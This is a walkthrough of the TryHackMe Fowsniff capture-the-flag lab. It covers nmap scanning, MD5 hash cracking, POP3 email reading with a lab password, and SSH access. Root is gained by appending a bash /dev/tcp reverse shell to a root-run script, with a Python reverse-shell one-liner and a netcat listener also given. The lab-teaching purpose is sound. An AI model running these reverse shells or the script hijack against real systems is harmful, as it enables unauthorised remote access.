
# TryHackMe - Fowsniff CTF Lab: Walkthrough

## Overview

The "Fowsniff" room on TryHackMe is an intermediate Capture The Flag (CTF) lab designed to simulate a real-world penetration test. The challenge emphasizes skills such as OSINT (Open Source Intelligence), password cracking, POP3 enumeration, privilege escalation through insecure scripts, and post-exploitation.

---

## Objective

Compromise the target system by identifying credentials through open-source intelligence, accessing the system, escalating privileges, and extracting the root flag.

---

## Step 1: Service Enumeration

A standard Nmap scan was performed to identify open ports and running services:


nmap -sC -sV -oN nmap.txt <target-ip>


### Result:

* Port 22: SSH
* Port 80: HTTP
* Port 110: POP3
* Port 143: IMAP

HTTP (port 80) hosted a public website referencing the companyâ€™s official Twitter handle.

---

## Step 2: Open Source Intelligence (OSINT)

The Twitter page mentioned a security breach and included a Pastebin link, which hosted leaked credentials in the form of MD5 password hashes associated with multiple usernames.

---

## Step 3: Password Hash Cracking

Extracted hashes were cracked using John the Ripper with the rockyou.txt wordlist:


john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt


Several hashes were successfully cracked, revealing plaintext credentials for users such as seina and baksteen.

or You can also use online platform to crack the password Hashes.

---

## Step 4: POP3 Login and Email Enumeration

With the cracked credentials, we performed POP3 login to access user emails:


telnet <target-ip> 110
USER seina
PASS scoobydoo2


Using POP3 commands:

LIST
RETR 1
RETR 2


One of the emails contained a temporary SSH password for the user baksteen.

---

## Step 5: SSH Access

Using credentials from the email, SSH access was obtained:


ssh baksteen@<target-ip>
password: #######


Once inside, enumeration showed that user baksteen had write access to /opt/cube/cube.sh, a script executed automatically with root privileges on SSH login.

---

## Step 6: Privilege Escalation

Privilege escalation was achieved by appending a reverse shell to the cube.sh script:


echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /opt/cube/cube.sh


or You can also use poython reverse shell:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


A listener was set up on the attacker's machine:


nc -lvnp 4444


Upon subsequent SSH login, the reverse shell executed and provided root access.

---

## Step 7: Post-Exploitation

With root access obtained, the final flag was retrieved:


whoami      # root
cat /root/root.txt


---

## Conclusion

The Fowsniff lab highlights the importance of open-source intelligence, effective credential management, and the security risks posed by insecure scripts executed with elevated privileges. The attack path followed a logical progression from external enumeration to root-level exploitation, making it a valuable learning exercise for aspiring penetration testers.

---

## Tools Used

* Nmap
* John the Ripper
* Hydra / Telnet (optional for POP3)
* SSH
* Netcat
*
